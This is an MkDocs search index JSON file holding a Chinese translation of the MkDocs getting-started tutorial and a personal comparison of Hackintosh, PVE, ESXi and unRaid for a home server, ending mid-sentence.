{"config":{"lang":["en","ja"],"separator":"[\\s\\-\uff0c\u3002]+","pipeline":["trimmer","stemmer"]},"docs":[{"location":"1/1/","title":"\u4f7f\u7528\u200bMKDocs\u200b\u53d1\u5e03\u200bMarkdown\u200b\u6587\u6863","text":"<p>MkDocs \u200b\u662f\u200b\u4e00\u6b3e\u200b\u5feb\u901f\u200b\u3001\u200b\u7b80\u5355\u200b\u4e14\u200b\u6781\u5176\u200b\u51fa\u8272\u200b\u7684\u200b\u9759\u6001\u200b\u7ad9\u70b9\u200b\u751f\u6210\u5668\u200b\uff0c\u200b\u65e8\u5728\u200b\u6784\u5efa\u200b\u9879\u76ee\u200b\u6587\u6863\u200b\u3002\u200b\u6587\u6863\u200b\u6e90\u6587\u4ef6\u200b\u4ee5\u200b Markdown \u200b\u7f16\u5199\u200b\uff0c\u200b\u5e76\u200b\u4f7f\u7528\u200b\u5355\u4e2a\u200b YAML \u200b\u914d\u7f6e\u6587\u4ef6\u200b\u8fdb\u884c\u200b\u914d\u7f6e\u200b\u3002\u200b\u9996\u5148\u200b\u9605\u8bfb\u200b\u5165\u95e8\u6559\u7a0b\u200b\uff0c\u200b\u7136\u540e\u200b\u67e5\u770b\u200b \u200b\u7528\u6237\u200b\u6307\u5357\u200b\u4ee5\u200b\u4e86\u89e3\u200b\u66f4\u200b\u591a\u200b\u4fe1\u606f\u200b\u3002</p>"},{"location":"1/1/#_1","title":"\u5b89\u88c5","text":"<p>\u200b\u8981\u200b\u5b89\u88c5\u200b MkDocs\uff0c\u200b\u8bf7\u200b\u4ece\u200b\u547d\u4ee4\u884c\u200b\u8fd0\u884c\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\uff1a</p> Bash<pre><code>pip install mkdocs\n</code></pre> <p>\u200b\u6709\u5173\u200b\u8be6\u7ec6\u4fe1\u606f\u200b\uff0c\u200b\u8bf7\u53c2\u9605\u200b\u5b89\u88c5\u200b\u6307\u5357\u200b\u3002</p>"},{"location":"1/1/#_2","title":"\u521b\u5efa\u200b\u65b0\u200b\u9879\u76ee","text":"<p>\u200b\u5165\u95e8\u200b\u975e\u5e38\u7b80\u5355\u200b\u3002\u200b\u8981\u200b\u521b\u5efa\u200b\u65b0\u200b\u9879\u76ee\u200b\uff0c\u200b\u8bf7\u200b\u4ece\u200b\u547d\u4ee4\u884c\u200b\u8fd0\u884c\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\uff1a</p> Bash<pre><code>mkdocs new my-project\ncd my-project\n</code></pre> <p>\u200b\u8bf7\u82b1\u200b\u4e00\u70b9\u200b\u65f6\u95f4\u200b\u6765\u200b\u68c0\u67e5\u4e00\u4e0b\u200b\u4e3a\u200b\u60a8\u200b\u521b\u5efa\u200b\u7684\u200b\u521d\u59cb\u200b\u9879\u76ee\u200b\u3002</p> <p></p>"},{"location":"1/1/#mkdocs","title":"\u521d\u59cb\u200b MkDocs \u200b\u5e03\u5c40","text":"<p>\u200b\u6709\u200b\u4e00\u4e2a\u200b\u540d\u4e3a\u200b \u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200bmkdocs.yml\uff0c\u200b\u4ee5\u53ca\u200b\u4e00\u4e2a\u200b\u540d\u4e3a\u200b \u200b\u7684\u200b\u6587\u4ef6\u5939\u200b docs\uff0c\u200b\u5176\u4e2d\u200b\u5305\u542b\u200b\u60a8\u200b\u7684\u200b\u6587\u6863\u200b\u6e90\u6587\u4ef6\u200b\uff08\u200b\u662f\u200bdocs_dirdocs\u200b\u914d\u7f6e\u200b\u8bbe\u7f6e\u200b\u7684\u200b\u9ed8\u8ba4\u503c\u200b\uff09\u3002\u200b\u76ee\u524d\u200b\uff0c\u200b\u8be5\u200b \u200b\u6587\u4ef6\u5939\u200b\u4ec5\u200b\u5305\u542b\u200b\u4e00\u4e2a\u200b\u540d\u4e3a\u200b \u200b\u7684\u200b\u6587\u6863\u200b\u9875\u9762\u200b\u3002docsindex.md</p> <p>MkDocs \u200b\u5e26\u6709\u200b\u5185\u7f6e\u200b\u5f00\u53d1\u200b\u670d\u52a1\u5668\u200b\uff0c\u200b\u53ef\u200b\u8ba9\u200b\u60a8\u200b\u5728\u200b\u5904\u7406\u200b\u6587\u6863\u200b\u65f6\u200b\u9884\u89c8\u200b\u6587\u6863\u200b\u3002\u200b\u786e\u4fdd\u60a8\u200b\u4e0e\u200bmkdocs.yml \u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4f4d\u4e8e\u200b\u540c\u4e00\u200b\u76ee\u5f55\u200b\u4e2d\u200b\uff0c\u200b\u7136\u540e\u200b\u901a\u8fc7\u200b\u8fd0\u884c\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\u542f\u52a8\u200b\u670d\u52a1\u5668\u200bmkdocs serve \uff1a</p> Bash<pre><code>$ mkdocs serve\nINFO    -  Building documentation...\nINFO    -  Cleaning site directory\nINFO    -  Documentation built in 0.22 seconds\nINFO    -  [15:50:43] Watching paths for changes: 'docs', 'mkdocs.yml'\nINFO    -  [15:50:43] Serving on http://127.0.0.1:8000/\n</code></pre> <p>\u200b\u5728\u200b\u6d4f\u89c8\u5668\u200b\u4e2d\u200b\u6253\u5f00\u200bhttp://127.0.0.1:8000/\uff0c\u200b\u60a8\u200b\u5c06\u200b\u770b\u5230\u200b\u663e\u793a\u200b\u7684\u200b\u9ed8\u8ba4\u4e3b\u9875\u200b\uff1a</p> <p></p>"},{"location":"1/1/#mkdocs_1","title":"MkDocs \u200b\u5b9e\u65f6\u200b\u670d\u52a1\u5668","text":"<p>\u200b\u5f00\u53d1\u200b\u670d\u52a1\u5668\u200b\u8fd8\u200b\u652f\u6301\u200b\u81ea\u52a8\u200b\u91cd\u65b0\u200b\u52a0\u8f7d\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ea\u8981\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u3001\u200b\u6587\u6863\u200b\u76ee\u5f55\u200b\u6216\u200b\u4e3b\u9898\u76ee\u5f55\u200b\u4e2d\u200b\u7684\u200b\u4efb\u4f55\u200b\u5185\u5bb9\u200b\u53d1\u751f\u53d8\u5316\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u91cd\u5efa\u200b\u60a8\u200b\u7684\u200b\u6587\u6863\u200b\u3002</p> <p>\u200b\u5728\u200b\u60a8\u200b\u9009\u62e9\u200b\u7684\u200b\u6587\u672c\u7f16\u8f91\u200b\u5668\u4e2d\u200b\u6253\u5f00\u200bdocs/index.md\u200b\u6587\u6863\u200b\uff0c\u200b\u5c06\u200b\u521d\u59cb\u200b\u6807\u9898\u200b\u66f4\u200b\u6539\u4e3a\u200bMkLorum\uff0c\u200b\u7136\u540e\u200b\u4fdd\u5b58\u200b\u66f4\u6539\u200b\u3002\u200b\u60a8\u200b\u7684\u200b\u6d4f\u89c8\u5668\u200b\u5c06\u200b\u81ea\u52a8\u200b\u91cd\u65b0\u200b\u52a0\u8f7d\u200b\uff0c\u200b\u60a8\u200b\u5e94\u8be5\u200b\u7acb\u5373\u200b\u770b\u5230\u200b\u66f4\u65b0\u200b\u540e\u200b\u7684\u200b\u6587\u6863\u200b\u3002</p> <p>\u200b\u73b0\u5728\u200b\u5c1d\u8bd5\u200b\u7f16\u8f91\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff1amkdocs.yml\u3002\u200b\u5c06\u200b\u8bbe\u7f6e\u200b\u66f4\u6539\u200b site_name\u200b\u4e3a\u200bMkLorum\u200b\u5e76\u200b\u4fdd\u5b58\u200b\u6587\u4ef6\u200b\u3002</p> YAML<pre><code>site_name: MkLorum\n</code></pre> <p>\u200b\u60a8\u200b\u7684\u200b\u6d4f\u89c8\u5668\u200b\u5e94\u7acb\u5373\u200b\u91cd\u65b0\u200b\u52a0\u8f7d\u200b\uff0c\u200b\u5e76\u4e14\u200b\u60a8\u200b\u5c06\u200b\u770b\u5230\u200b\u65b0\u200b\u7684\u200b\u7f51\u7ad9\u200b\u540d\u79f0\u200b\u751f\u6548\u200b\u3002</p> <p>YAML<pre><code>site_name \u200b\u8bbe\u7f6e\u200b\n</code></pre> </p> <p>\u200b\u6ce8\u610f\u200b\uff1a\u200b\u914d\u7f6e\u200b\u9009\u9879\u200bsite_name\u200b\u662f\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e2d\u200b\u552f\u4e00\u200b\u5fc5\u9700\u200b\u7684\u200b\u9009\u9879\u200b\u3002</p>"},{"location":"1/1/#_3","title":"\u6dfb\u52a0\u200b\u9875\u9762","text":"<p>\u200b\u73b0\u5728\u200b\u5411\u200b\u60a8\u200b\u7684\u200b\u6587\u6863\u200b\u6dfb\u52a0\u200b\u7b2c\u4e8c\u9875\u200b\uff1a</p> Bash<pre><code>curl 'https://jaspervdj.be/lorem-markdownum/markdown.txt' &gt; docs/about.md\n</code></pre> <p>\u200b\u7531\u4e8e\u200b\u6211\u4eec\u200b\u7684\u200b\u6587\u6863\u200b\u7ad9\u70b9\u200b\u5c06\u200b\u5305\u542b\u200b\u4e00\u4e9b\u200b\u5bfc\u822a\u200b\u6807\u9898\u200b\uff0c\u200b\u60a8\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u7f16\u8f91\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u5e76\u200b\u901a\u8fc7\u200b\u6dfb\u52a0\u200b\u8bbe\u7f6e\u200b\u6765\u200b\u6dfb\u52a0\u200b\u6709\u5173\u200b\u5bfc\u822a\u200b\u6807\u9898\u200b\u4e2d\u200b\u6bcf\u4e2a\u200b\u9875\u9762\u200b\u7684\u200b\u987a\u5e8f\u200b\u3001\u200b\u6807\u9898\u200b\u548c\u200b\u5d4c\u5957\u200b\u7684\u200b\u4e00\u4e9b\u200b\u4fe1\u606f\u200bnav \uff1a</p> YAML<pre><code>site_name: MkLorum\nnav:\n  - Home: index.md\n  - About: about.md\n</code></pre> <p>\u200b\u4fdd\u5b58\u200b\u66f4\u6539\u200b\uff0c\u200b\u60a8\u200b\u5c06\u200b\u770b\u5230\u200b\u4e00\u4e2a\u200b\u5bfc\u822a\u200b\u680f\u200b\uff0c \u200b\u5de6\u4fa7\u200b\u6709\u200bHome\u200b\u548c\u200b\u9879\u76ee\u200b\uff0c\u200b\u53f3\u4fa7\u200b\u6709\u200b\u3001\u200b\u548c\u200b\u9879\u76ee\u200b\u3002AboutSearchPreviousNext</p> <p></p> <p>\u200b\u5c1d\u8bd5\u200b\u83dc\u5355\u9879\u200b\u5e76\u200b\u5728\u200b\u9875\u9762\u200b\u4e4b\u95f4\u200b\u6765\u56de\u200b\u5bfc\u822a\u200b\u3002\u200b\u7136\u540e\u200b\u70b9\u51fb\u200b Search\u3002\u200b\u5c06\u200b\u51fa\u73b0\u200b\u4e00\u4e2a\u200b\u641c\u7d22\u200b\u5bf9\u8bdd\u6846\u200b\uff0c\u200b\u5141\u8bb8\u200b\u60a8\u200b\u641c\u7d22\u200b\u4efb\u4f55\u200b\u9875\u9762\u200b\u4e0a\u200b\u7684\u200b\u4efb\u4f55\u200b\u6587\u672c\u200b\u3002\u200b\u8bf7\u200b\u6ce8\u610f\u200b\uff0c\u200b\u641c\u7d22\u200b\u7ed3\u679c\u200b\u5305\u62ec\u200b\u7f51\u7ad9\u200b\u4e0a\u200b\u641c\u7d22\u8bcd\u200b\u7684\u200b\u6bcf\u6b21\u200b\u51fa\u73b0\u200b\uff0c\u200b\u5e76\u200b\u76f4\u63a5\u200b\u94fe\u63a5\u200b\u5230\u200b\u641c\u7d22\u8bcd\u200b\u51fa\u73b0\u200b\u7684\u200b\u9875\u9762\u200b\u90e8\u5206\u200b\u3002\u200b\u60a8\u200b\u65e0\u9700\u200b\u4ed8\u51fa\u200b\u4efb\u4f55\u200b\u52aa\u529b\u200b\u6216\u200b\u8fdb\u884c\u200b\u4efb\u4f55\u200b\u914d\u7f6e\u200b\u5373\u53ef\u200b\u83b7\u5f97\u200b\u6240\u6709\u200b\u8fd9\u4e9b\u200b\uff01</p> <p></p>"},{"location":"1/1/#_4","title":"\u4e3b\u9898\u200b\u5316\u200b\u6211\u4eec\u200b\u7684\u200b\u6587\u6863","text":"<p>\u200b\u73b0\u5728\u200b\u901a\u8fc7\u200b\u66f4\u6539\u200b\u4e3b\u9898\u200b\u6765\u200b\u66f4\u6539\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4ee5\u200b\u6539\u53d8\u200b\u6587\u6863\u200b\u7684\u200b\u663e\u793a\u65b9\u5f0f\u200b\u3002\u200b\u7f16\u8f91\u200bmkdocs.yml\u200b\u6587\u4ef6\u200b\u5e76\u200b\u6dfb\u52a0\u200btheme\u200b\u8bbe\u7f6e\u200b\uff1a</p> YAML<pre><code>site_name: MkLorum\nnav:\n  - Home: index.md\n  - About: about.md\ntheme: readthedocs\n</code></pre> <p>\u200b\u4fdd\u5b58\u200b\u60a8\u200b\u7684\u200b\u66f4\u6539\u200b\uff0c\u200b\u60a8\u200b\u5c06\u200b\u770b\u5230\u200b\u6b63\u5728\u200b\u4f7f\u7528\u200b\u7684\u200b ReadTheDocs \u200b\u4e3b\u9898\u200b\u3002</p> <p></p>"},{"location":"1/1/#_5","title":"\u66f4\u200b\u591a\u200b\u63a8\u8350\u200b\u7684\u200b\u4e3b\u9898","text":"<ul> <li>mkdocs-material</li> </ul>"},{"location":"1/1/#_6","title":"\u66f4\u6539\u200b\u7f51\u7ad9\u200b\u56fe\u6807","text":"<p>\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0cMkDocs \u200b\u4f7f\u7528\u200bMkDocs \u200b\u7f51\u7ad9\u200b\u56fe\u6807\u200b\u3002\u200b\u8981\u200b\u4f7f\u7528\u200b\u5176\u4ed6\u200b\u56fe\u6807\u200b\uff0c\u200b\u8bf7\u200b\u5728\u200b\u76ee\u5f55\u200bimg\u200b\u4e2d\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u5b50\u76ee\u5f55\u200bdocs\u200b\u5e76\u200b\u5c06\u200b\u60a8\u200b\u7684\u200b\u81ea\u5b9a\u4e49\u200b\u6587\u4ef6\u200b\u590d\u5236\u200bfavicon.ico \u200b\u5230\u200b\u8be5\u200b\u76ee\u5f55\u200b\u3002MkDocs \u200b\u5c06\u200b\u81ea\u52a8\u68c0\u6d4b\u200b\u5e76\u200b\u4f7f\u7528\u200b\u8be5\u200b\u6587\u4ef6\u200b\u4f5c\u4e3a\u200b\u60a8\u200b\u7684\u200b\u7f51\u7ad9\u200b\u56fe\u6807\u200b\u3002</p>"},{"location":"1/1/#_7","title":"\u5efa\u7acb\u200b\u7f51\u7ad9","text":"<p>\u200b\u770b\u8d77\u6765\u200b\u4e0d\u9519\u200b\u3002\u200b\u60a8\u200b\u5df2\u200b\u51c6\u5907\u200b\u597d\u200b\u90e8\u7f72\u200b\u6587\u6863\u200b\u7684\u200b\u7b2c\u4e00\u904d\u200bMkLorum \u3002\u200b\u9996\u5148\u200b\u6784\u5efa\u200b\u6587\u6863\u200b\uff1a</p> Bash<pre><code>mkdocs build\n</code></pre> <p>\u200b\u8fd9\u200b\u5c06\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u540d\u4e3a\u200b \u200b\u7684\u200b\u65b0\u200b\u76ee\u5f55\u200bsite\u3002\u200b\u67e5\u770b\u200b\u76ee\u5f55\u200b\u5185\u90e8\u200b\uff1a</p> Bash<pre><code>$ ls site\nabout  fonts  index.html  license  search.html\ncss    img    js          mkdocs   sitemap.xml\n</code></pre> <p>\u200b\u8bf7\u200b\u6ce8\u610f\u200b\uff0c\u200b\u60a8\u200b\u7684\u200b\u6e90\u200b\u6587\u6863\u200b\u5df2\u200b\u8f93\u51fa\u200b\u4e3a\u200b\u4e24\u4e2a\u200b HTML \u200b\u6587\u4ef6\u200b\uff0c\u200b\u5206\u522b\u200b\u540d\u4e3a\u200b index.html\u200b\u548c\u200babout/index.html\u3002\u200b\u60a8\u200b\u8fd8\u6709\u200b\u5404\u79cd\u200b\u5176\u4ed6\u200b\u5a92\u4f53\u200b\u5df2\u200b\u590d\u5236\u5230\u200bsite\u200b\u76ee\u5f55\u200b\u4e2d\u200b\u4f5c\u4e3a\u200b\u6587\u6863\u200b\u4e3b\u9898\u200b\u7684\u200b\u4e00\u90e8\u5206\u200b\u3002\u200b\u60a8\u200b\u751a\u81f3\u200b\u6709\u200b\u4e00\u4e2a\u200bsitemap.xml\u200b\u6587\u4ef6\u200b\u548c\u200bmkdocs/search_index.json\u3002</p> <p>\u200b\u5982\u679c\u200b\u60a8\u200b\u4f7f\u7528\u200b\u6e90\u4ee3\u7801\u200b\u63a7\u5236\u200b\uff0c\u200b\u4f8b\u5982\u200bgit\u200b\u60a8\u200b\u53ef\u80fd\u200b\u4e0d\u60f3\u200b\u5c06\u200b\u60a8\u200b\u7684\u200b\u6587\u6863\u200b\u6784\u5efa\u200b\u68c0\u67e5\u200b\u5230\u200b\u5b58\u50a8\u200b\u5e93\u4e2d\u200b\u3002 site/\u200b\u5728\u200b\u60a8\u200b\u7684\u200b.gitignore\u200b\u6587\u4ef6\u200b\u4e2d\u200b\u6dfb\u52a0\u200b\u4e00\u884c\u200b\u3002</p> Bash<pre><code>echo \"site/\" &gt;&gt; .gitignore\n</code></pre> <p>\u200b\u5982\u679c\u200b\u60a8\u200b\u6b63\u5728\u200b\u4f7f\u7528\u200b\u5176\u4ed6\u200b\u6e90\u4ee3\u7801\u200b\u63a7\u5236\u200b\u5de5\u5177\u200b\uff0c\u200b\u60a8\u200b\u5c06\u200b\u9700\u8981\u200b\u68c0\u67e5\u200b\u5176\u200b\u6587\u6863\u200b\u4ee5\u200b\u4e86\u89e3\u200b\u5982\u4f55\u200b\u5ffd\u7565\u200b\u7279\u5b9a\u200b\u76ee\u5f55\u200b\u3002</p>"},{"location":"1/1/#_8","title":"\u5176\u4ed6\u200b\u547d\u4ee4\u200b\u548c\u200b\u9009\u9879","text":"<p>\u200b\u8fd8\u6709\u200b\u5404\u79cd\u200b\u5176\u4ed6\u200b\u547d\u4ee4\u200b\u548c\u200b\u9009\u9879\u200b\u53ef\u7528\u200b\u3002\u200b\u8981\u200b\u83b7\u53d6\u200b\u5b8c\u6574\u200b\u7684\u200b\u547d\u4ee4\u200b\u5217\u8868\u200b\uff0c\u200b\u8bf7\u200b\u4f7f\u7528\u200b\u4ee5\u4e0b\u200b--help\u200b\u6807\u5fd7\u200b\uff1a</p> Bash<pre><code>mkdocs --help\n</code></pre> <p>\u200b\u8981\u200b\u67e5\u770b\u200b\u7ed9\u5b9a\u200b\u547d\u4ee4\u200b\u7684\u200b\u53ef\u7528\u200b\u9009\u9879\u200b\u5217\u8868\u200b\uff0c\u200b\u8bf7\u200b\u5c06\u200b--help\u200b\u6807\u5fd7\u200b\u4e0e\u200b\u8be5\u200b\u547d\u4ee4\u200b\u4e00\u8d77\u200b\u4f7f\u7528\u200b\u3002\u200b\u4f8b\u5982\u200b\uff0c\u200b\u8981\u200b\u83b7\u53d6\u200b\u8be5\u200b\u547d\u4ee4\u200b\u53ef\u7528\u200b\u7684\u200b\u6240\u6709\u200b\u9009\u9879\u200b\u7684\u200b\u5217\u8868\u200b\uff0c build\u200b\u8bf7\u200b\u8fd0\u884c\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\uff1a</p> Bash<pre><code>mkdocs build --help\n</code></pre>"},{"location":"1/1/#_9","title":"\u90e8\u7f72","text":"<p>\u200b\u60a8\u200b\u521a\u521a\u200b\u6784\u5efa\u200b\u7684\u200b\u6587\u6863\u200b\u7ad9\u70b9\u200b\u4ec5\u200b\u4f7f\u7528\u200b\u9759\u6001\u200b\u6587\u4ef6\u200b\uff0c\u200b\u56e0\u6b64\u200b\u60a8\u200b\u51e0\u4e4e\u200b\u53ef\u4ee5\u200b\u4ece\u200b\u4efb\u4f55\u200b\u5730\u65b9\u200b\u6258\u7ba1\u200b\u5b83\u200b\u3002\u200b\u53ea\u200b\u9700\u200b\u5c06\u200b\u6574\u4e2a\u200bsite\u200b\u76ee\u5f55\u200b\u7684\u200b\u5185\u5bb9\u200b\u4e0a\u200b\u4f20\u5230\u200b\u60a8\u200b\u6258\u7ba1\u200b\u7f51\u7ad9\u200b\u7684\u200b\u4efb\u4f55\u200b\u4f4d\u7f6e\u200b\u5373\u53ef\u200b\u3002\u200b\u6709\u5173\u200b\u4e00\u4e9b\u200b\u5e38\u89c1\u200b\u4e3b\u673a\u200b\u7684\u200b\u5177\u4f53\u200b\u8bf4\u660e\u200b\uff0c\u200b\u8bf7\u53c2\u9605\u200b \u200b\u90e8\u7f72\u200b\u6587\u6863\u200b\u9875\u9762\u200b\u3002</p>"},{"location":"1/1/#_10","title":"\u83b7\u53d6\u200b\u5e2e\u52a9","text":"<p>\u200b\u8bf7\u53c2\u9605\u200b \u200b\u7528\u6237\u200b\u6307\u5357\u200b \u200b\u4ee5\u200b\u83b7\u53d6\u200b\u6709\u5173\u200b MkDocs \u200b\u6240\u6709\u200b\u529f\u80fd\u200b\u7684\u200b\u66f4\u200b\u5b8c\u6574\u200b\u6587\u6863\u200b\u3002</p> <p>\u200b\u8981\u200b\u83b7\u5f97\u200b\u6709\u5173\u200b MkDocs \u200b\u7684\u200b\u5e2e\u52a9\u200b\uff0c\u200b\u8bf7\u200b\u4f7f\u7528\u200b GitHub Discussions \u200b\u6216\u200b GitHub Issues\u3002</p>"},{"location":"1/2/","title":"\u7cfb\u7edf\u200b\u9009\u62e9","text":""},{"location":"1/2/#_1","title":"\u9ed1\u200b\u82f9\u679c","text":"<p>\u200b\u8fd9\u53f0\u200b\u673a\u5668\u200b\u4e5f\u200b\u662f\u200b\u652f\u6301\u200b\u7269\u7406\u200b\u673a\u9ed1\u200b\u82f9\u679c\u200b\u7684\u200b\uff0c\u200b\u56fd\u5149\u200b\u6211\u200b\u5c1d\u8bd5\u200b\u5b89\u88c5\u200b\u6210\u529f\u200b\u8fc7\u200b\uff0c\u200b\u4f46\u662f\u200b\u6709\u200b 1 \u200b\u4e2a\u200b\u5de8\u5927\u200b\u7684\u200b\u5751\u70b9\u200b\uff1a\u200b\u9ed1\u200b\u82f9\u679c\u200b\u5bf9\u200b\u53cc\u8def\u200b\u5f88\u591a\u200b\u4e2a\u200b CPU  \u200b\u7684\u200b\u652f\u6301\u200b\u4e0d\u662f\u200b\u5f88\u200b\u597d\u200b\uff0cmacOS \u200b\u5e95\u5c42\u200b\u6700\u5927\u200b\u53ea\u200b\u652f\u6301\u200b 32\u200b\u6838\u200b 64 \u200b\u7ebf\u7a0b\u200b\u7684\u200b CPU\uff0c\u200b\u6240\u4ee5\u200b\u6211\u200b\u53ea\u80fd\u200b BIOS \u200b\u9609\u5272\u200b CPU \u200b\u7684\u200b\u6570\u91cf\u200b\u624d\u200b\u53ef\u4ee5\u200b\u6210\u529f\u200b\u8dd1\u200b\u8d77\u6765\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6700\u540e\u200b\u7684\u200b\u8dd1\u200b\u5206\u200b\u4e5f\u200b\u4e0d\u662f\u200b\u5f88\u5f3a\u200b\uff0c\u200b\u4f46\u662f\u200b\u56fe\u200b\u6ca1\u6709\u200b\u4e86\u200b\uff0c\u200b\u4e0b\u9762\u200b\u5c31\u200b\u4e0a\u200b\u4e00\u4e0b\u200b\u5355\u8def\u200b\u7269\u7406\u200b\u9ed1\u200b\u82f9\u679c\u200b\u7684\u200b\u8dd1\u200b\u5206\u200b\u60c5\u51b5\u200b\u5427\u200b\uff1a</p> \u200b\u5f88\u591a\u200b\u4e2a\u200b\u6846\u6846\u200bR23 \u200b\u8dd1\u200b\u5206\u200b <p></p> <p> </p> <p>\u200b\u56e0\u4e3a\u200b\u5f97\u200b\u9609\u5272\u200b CPU \u200b\u6570\u91cf\u200b\u624d\u200b\u53ef\u4ee5\u200b\u8dd1\u200b\u7269\u7406\u200b\u9ed1\u200b\u82f9\u679c\u200b\uff0c\u200b\u8fd9\u200b\u600e\u4e48\u200b\u80fd\u5fcd\u200b\uff1f\u200b\u6240\u4ee5\u200b\u8fd9\u4e2a\u200b\u7269\u7406\u200b\u9ed1\u200b\u82f9\u679c\u200b\u65b9\u6848\u200b\u5c31\u200b\u9996\u5148\u200b\u6392\u9664\u200b\u6389\u200b\u4e86\u200b\u3002</p>"},{"location":"1/2/#pve","title":"PVE","text":"<p>\u200b\u5168\u79f0\u200b Proxmox Virtual Environment\uff0c\u200b\u662f\u200b\u57fa\u4e8e\u200b Debian \u200b\u7684\u200b Linux \u200b\u7cfb\u7edf\u200b\uff0c\u200b\u865a\u62df\u673a\u200b\u5185\u6838\u200b\u4e3a\u200b KVM\u3002\u200b\u786c\u4ef6\u200b\u517c\u5bb9\u6027\u200b\u4f18\u79c0\u200b\u3002Web UI \u200b\u7684\u200b\u754c\u9762\u200b\u529f\u80fd\u200b\u4e0d\u200b\u5f3a\u200b\uff0c\u200b\u4f46\u662f\u200b\u5982\u679c\u200b\u901a\u8fc7\u200b\u547d\u4ee4\u884c\u200b\u53bb\u200b\u64cd\u4f5c\u200b\u7684\u8bdd\u200b\uff0c\u200b\u6269\u5c55\u200b\u5b9a\u5236\u200b\u80fd\u529b\u200b\u51e0\u4e4e\u200b\u662f\u200b\u65e0\u9650\u200b\u7684\u200b\u3002</p> <p> </p>"},{"location":"1/2/#esxi","title":"ESXi","text":"<p>\u200b\u662f\u200b VMWare vSphere Hypervisor \u200b\u5957\u4ef6\u200b\u4e4b\u4e0b\u200b\u91cd\u8981\u200b\u7ec4\u4ef6\u200b\u3002\u200b\u524d\u671f\u200b\u4f9d\u8d56\u200b Linux \u200b\u6e90\u7801\u200b\uff0c\u200b\u540e\u6765\u200b\u629b\u5f03\u200b Linux \u200b\u505a\u6210\u200b\u4e86\u200bESXi\u3002\u200b\u5f88\u200b\u6210\u719f\u200b\u7684\u200b\u5546\u4e1a\u200b\u4ea7\u54c1\u200b\uff0c\u200b\u754c\u9762\u200b\u6e05\u6670\u200b\u6613\u7528\u200b\uff0c\u200b\u4f46\u200b\u5bf9\u200b\u5bb6\u7528\u200b\u786c\u4ef6\u200b\u7684\u200b\u517c\u5bb9\u6027\u200b\u8f83\u5dee\u200b\uff08\u200b\u4e3b\u8981\u200b\u9762\u5411\u200b\u5546\u4e1a\u200b\u670d\u52a1\u5668\u200b\uff09\uff0c\u200b\u6269\u5c55\u200b\u53ef\u200b\u5b9a\u5236\u200b\u7a0b\u5ea6\u200b\u4e0d\u9ad8\u200b\u3002</p> <p> </p>"},{"location":"1/2/#unraid","title":"unRaid","text":"<p>\u200b\u662f\u200b 1 \u200b\u4e2a\u200b NAS\u200b\u7cfb\u7edf\u200b\uff0c\u200b\u662f\u200b\u57fa\u4e8e\u200b Slackware \u200b\u7684\u200b Linux \u200b\u7cfb\u7edf\u200b\uff0c\u200b\u865a\u62df\u673a\u200b\u5185\u6838\u200b\u4e5f\u200b\u662f\u200b KVM\u3002\u200b\u78c1\u76d8\u9635\u5217\u200b\u7ba1\u7406\u200b\u975e\u5e38\u200b\u6709\u200b\u7279\u8272\u200b\uff0c\u200b\u7075\u6d3b\u6027\u200b\u5f88\u200b\u9ad8\u200b\u3002\u200b\u540c\u65f6\u200b\u8fd8\u6709\u200b\u5f88\u200b\u4e0d\u9519\u200b\u7684\u200b\u63d2\u4ef6\u200b\u3001Docker \u200b\u548c\u200b\u865a\u62df\u673a\u200b\u652f\u6301\u200b\u3002</p> <p></p>"},{"location":"1/2/#_2","title":"\u603b\u7ed3","text":"\u4ea7\u54c1\u200b \u200b\u76f4\u901a\u200b \u200b\u7f51\u7edc\u200b\u914d\u7f6e\u200b \u200b\u6269\u5c55\u6027\u200b \u200b\u96be\u5ea6\u200b PVE \u200b\u5f88\u68d2\u200b \u200b\u4e00\u822c\u200b \u200b\u9ad8\u200b \u200b\u56f0\u96be\u200b ESXi \u200b\u4e00\u822c\u200b \u200b\u5f3a\u5927\u200b \u200b\u4f4e\u200b \u200b\u4e2d\u7b49\u200b unRaid \u200b\u4e00\u822c\u200b \u200b\u7b80\u964b\u200b \u200b\u4e2d\u200b \u200b\u7b80\u5355\u200b <p>\u200b\u7b80\u5355\u200b\u603b\u7ed3\u200b\u4e00\u4e0b\u200b\uff1aPVE \u200b\u9002\u5408\u200b\u6709\u200b Linux \u200b\u57fa\u7840\u200b\u7684\u200b\u73a9\u5bb6\u200b\uff0c\u200b\u6298\u817e\u200b\u597d\u200b\u7684\u8bdd\u200b\uff0c\u200b\u6613\u7528\u6027\u200b\u548c\u200b\u6269\u5c55\u6027\u200b\u662f\u200b\u53ef\u4ee5\u200b\u540a\u6253\u200b ESXi \u200b\u7684\u200b\u3002\u200b\u6240\u4ee5\u200b\u56fd\u5149\u200b\u6211\u200b\u4e5f\u200b\u5355\u72ec\u200b\u5f00\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u81ea\u6108\u200b\u6ca1\u200b\u8bb0\u5f55\u200b\u4ee5\u4e0b\u200b  PVE \u200b\u7684\u200b\u6298\u817e\u200b\u8bb0\u5f55\u200b\uff0c\u200b\u5b66\u4e60\u200b\u4e4b\u4f59\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5e2e\u52a9\u200b\u5230\u200b\u66f4\u200b\u591a\u200b\u5bf9\u200b PVE 